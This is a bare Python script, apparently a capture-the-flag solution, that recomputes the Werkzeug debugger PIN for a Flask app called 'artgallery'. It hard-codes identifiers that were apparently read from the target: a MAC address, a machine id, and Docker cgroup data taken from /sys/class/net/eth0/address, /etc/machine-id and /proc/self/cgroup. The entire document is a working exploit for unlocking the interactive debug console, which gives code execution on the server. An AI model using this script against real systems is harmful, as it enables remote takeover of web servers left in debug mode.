import hashlib
from itertools import chain
probably_public_bits = [
    'root',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.6/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
# int("02:42:ac:11:00:02".replace(":",''), 16)
# 39b195ea-ed93-48d0-946f-20d72c94441a
'''
11:memory:/docker/b9565bd1662fb8ab0c05eac3aced4000fbc687529778d7cf7abb6bd143b64459
/usr/bin/python3/home/artgallery/app.py
'''
#d613d32d78da916c7d4da2375f5089e4
private_bits = [
    '2485377892354',# str(uuid.getnode()),  /sys/class/net/eth0/address
    'd613d32d78da916c7d4da2375f5089e4b9565bd1662fb8ab0c05eac3aced4000fbc687529778d7cf7abb6bd143b64459'# get_machine_id(), /etc/machine-id + (/proc/sys/kernel/random/boot_id) +/proc/self/cgroup
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
